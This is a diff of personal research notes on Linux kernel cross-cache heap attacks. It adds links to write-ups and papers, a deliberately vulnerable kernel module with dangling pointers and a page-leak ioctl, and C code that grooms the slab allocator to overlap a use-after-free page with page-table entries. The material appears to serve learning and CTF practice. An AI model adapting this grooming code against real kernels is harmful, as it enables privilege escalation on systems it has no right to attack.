@@ -4,15 +4,21 @@
 
 ## Resources
 
--  kernel heap exploit-CSDN博客
+- Cross cache Attack技术细节分析
 
-[](https://blog.csdn.net/Palpitate_LL/article/details/148312183)
+[](https://xz.aliyun.com/news/16297)
+
+- Cross Cache Attack技术细节分析
+
+[](https://veritas501.github.io/2023_03_07-Cross Cache Attack技术细节分析/)
+
+- 【pwn】 IERAE CTF 2025 公式 Writeup
+
+[](https://gmo-cybersecurity.com/blog/ierae-ctf-2025-writeup-pwn/)
+
 -  CROSS-X: Generalized and Stable Cross-Cache Attack on the Linux Kernel
 
 [](https://dl.acm.org/doi/10.1145/3719027.3765152)
--  USENIX Security '24 - SLUBStick: Arbitrary Memory Writes through Practical Software Cross-Cache...
-
-<video src="https://www.youtube.com/watch?v=dPyJZxY0N7w"/>
 
 - d3kcache: From null-byte cross-cache overflow to infinite arbitrary read & write in physical memory space. 
 
@@ -22,13 +28,9 @@
 
 [](https://xz.aliyun.com/news/11863)
 
-- Cross Cache Attack CheatSheet
+-  kernel heap exploit-CSDN博客
 
-[](https://u1f383.github.io/linux/2025/01/03/cross-cache-attack-cheatsheet.html)
-
-- Cross cache Attack技术细节分析
-
-[](https://xz.aliyun.com/news/16297)
+[](https://blog.csdn.net/Palpitate_LL/article/details/148312183)
 
 ## cross-cache CTF challenges
 
@@ -41,7 +43,7 @@
 `corCTF 2022 - cache of castaways`: [](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/cache-of-castaways)
 
 ## Theory
-Order-n slab system
+Order-n slab system (not so important)
 ```Mermaid
 graph LR
     subgraph zone
@@ -450,24 +452,19 @@ int main(void) {
 [    8.501799] tsune: cross-cache succeed!
 ```
 
-## kmemcache-1024
-
-```c
-~ # cat /sys/kernel/slab/tsune_cache/objs_per_slab 
-8
-~ # cat /sys/kernel/slab/tsune_cache/cpu_partial 
-24
-```
-
-## kmalloc-1024
-
-## vm
+## PoC for most of the kernel allocator
+:thinking:
+- module summary
+  - linux kernel module that provide arbitrary number of alloc/free/read/write, with 1024 dangling pointer.
+- what I did
+  - cross-cache and overlap pte to the uaf page.
+### vm
 ```c
 $ uname -r
 6.15.6
 ```
 
-## module
+### module
 
 ```c
 #include <linux/module.h>
@@ -485,7 +482,9 @@ $ uname -r
 #define IOCTL_CMD_FREE 0x811
 #define IOCTL_CMD_READ 0x812
 #define IOCTL_CMD_WRITE 0x813
-#define MSG_SZ 1024
+#define IOCTL_CMD_PAGE 0x814
+#define MSG_SZ 512
+
 struct user_req {
     int idx;
     char *userland_buf;
@@ -506,6 +505,7 @@ static long tsune_ioctl(struct file *file, unsigned int cmd, unsigned long arg) 
     switch(cmd) {
         case IOCTL_CMD_ALLOC:
             ptrs[req.idx] = kmem_cache_alloc(tsune_cache, GFP_KERNEL);
+            printk("%x: %lx\n",req.idx,(unsigned long)ptrs[req.idx]);
             if (!ptrs[req.idx]) {
                 return -ENOMEM;
             }
@@ -529,6 +529,13 @@ static long tsune_ioctl(struct file *file, unsigned int cmd, unsigned long arg) 
                     return -EFAULT;
                 }
             }
+            break;
+        case IOCTL_CMD_PAGE:
+            if (ptrs[req.idx]) {
+                if (copy_to_user(req.userland_buf, (char *)((unsigned long)(ptrs[req.idx])&(~0xfff)), MSG_SZ)) {
+                    return -EFAULT;
+                }
+            }            
             break;
         default:
             return -EINVAL;
@@ -569,3 +576,135 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tsune");
 MODULE_DESCRIPTION("load to kernel heap master");
 ```
+
+## kmemcache-1024
+
+```c
+~ # cat /sys/kernel/slab/tsune_cache/objs_per_slab 
+8
+~ # cat /sys/kernel/slab/tsune_cache/cpu_partial 
+24
+```
+
+## kmemcache-512
+
+```c
+#define _GNU_SOURCE
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include "e.h"
+
+#define DEVICE_NAME "/dev/tsune"
+#define IOCTL_CMD_ALLOC 0x810
+#define IOCTL_CMD_FREE 0x811
+#define IOCTL_CMD_READ 0x812
+#define IOCTL_CMD_WRITE 0x813
+#define IOCTL_CMD_PAGE 0x814
+#define MSG_SZ 512
+
+#define N_PTE 0x8
+
+struct user_req {
+    int idx;
+    char *userland_buf;
+};
+
+#define OBJECT_SIZE 512
+#define OBJS_PER_SLAB 8 
+#define CPU_PARTIAL 52
+
+void ioctl_alloc(int fd, int i) {
+    struct user_req req = {
+        .idx = i,
+        .userland_buf = NULL
+    };
+
+    SYSCHK(ioctl(fd,IOCTL_CMD_ALLOC,&req));
+}
+
+void ioctl_free(int fd, int i) {
+    struct user_req req = {
+        .idx = i,
+        .userland_buf = NULL
+    };
+
+    SYSCHK(ioctl(fd,IOCTL_CMD_FREE,&req));
+}
+
+int main(void) {
+    info("kmemcache-512");
+
+    size_t size = 2*1024*1024;
+    hl(size)
+
+    void *pte_setup = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x0, 0x0, 0x0), size,
+                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
+    hl(pte_setup)
+    *(char *)pte_setup = 0x1;
+
+    int fd = SYSCHK(open(DEVICE_NAME, O_RDWR));
+    hl(fd);
+
+    info("1. allocate (cpu_partial+1)*objs_per_slab")
+    int global;
+    rep(_,(CPU_PARTIAL+1)*OBJS_PER_SLAB) {
+        ioctl_alloc(fd,global);
+        global++;
+    }
+
+    info("2. allocate objs_per_slab-1")
+    rep(_,OBJS_PER_SLAB-1) {
+        ioctl_alloc(fd,global);
+        global++;
+    }
+
+    info("3. allocate uaf object")
+    int uaf_idx = global;
+    ioctl_alloc(fd,global);
+    global++;
+
+    info("4. allocate objs_per_slab+1")
+    rep(_,OBJS_PER_SLAB+1) {
+        ioctl_alloc(fd,global);
+        global++;
+    }
+
+    info("5. free uaf object")
+    ioctl_free(fd,uaf_idx);
+
+    info("6. make page which has a uaf object empty")
+    range(i,1,OBJS_PER_SLAB) {
+        ioctl_free(fd,uaf_idx+i);
+        ioctl_free(fd,uaf_idx-i);
+    }
+
+    info("7. free one object per page")
+    rep(i,CPU_PARTIAL) {
+        ioctl_free(fd,OBJS_PER_SLAB*i);
+    }
+    
+    char buf[MSG_SZ];
+    struct user_req read = {
+        .idx = uaf_idx,
+        .userland_buf = buf,
+    };
+
+
+    void *pte_new = SYSCHK(mmap(PTI_TO_VIRT(0x1, 0x0, 0x80, 0x0, 0x0), size,
+                         PROT_READ | PROT_WRITE, MAP_PRIVATE | 0x20 | MAP_FIXED, -1, 0));
+    hl(pte_new)
+    for (size_t i = 0; i < size; i += 4096) {
+        *((char*)pte_new + i) = 1;
+    }
+
+    SYSCHK(ioctl(fd,IOCTL_CMD_READ,&read));
+    xxd_qword(buf,sizeof(buf));
+}
+```
+
+## kmalloc-1024
